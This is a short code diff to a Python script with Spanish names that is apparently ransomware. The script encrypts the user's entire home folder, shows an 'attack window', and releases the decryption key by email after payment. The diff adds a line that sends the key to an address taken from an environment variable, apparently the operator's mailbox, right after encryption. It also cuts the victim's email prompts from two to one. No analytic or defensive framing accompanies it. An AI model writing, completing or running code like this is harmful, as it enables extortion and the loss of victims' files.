@@ -16,18 +16,18 @@ def main():
     clave = generar_clave()
     carpeta_usuario = os.path.expanduser("~")
     encriptar_carpeta(clave, carpeta_usuario)
+    enviar_clave(os.getenv("CORREO_REMITENTE"), clave.decode())
 
     # 4. Mostrar ventana de ataque
     def despues_de_pagar():
         # 5. Pedir correos
-        correo1, correo2 = pedir_correos_y_mostrar()
+        correo1 = pedir_correos_y_mostrar()
         # 6. Enviar clave
         ex1 = enviar_clave(correo1, clave.decode())
-        ex2 = enviar_clave(correo2, clave.decode())
-        if ex1 and ex2:
-            mostrar_mensaje("Clave enviada", "La clave se ha enviado a ambos correos.")
+        if ex1:
+            mostrar_mensaje("Clave enviada", "La clave se ha enviado al correo ingresado")
         else:
-            mostrar_mensaje("Error", "No se pudo enviar la clave a uno o ambos correos.")
+            mostrar_mensaje("Error", "No se pudo enviar la clave.")
 
         # 7. Pedir clave y desencriptar si es correcta
         clave_ingresada = pedir_clave()
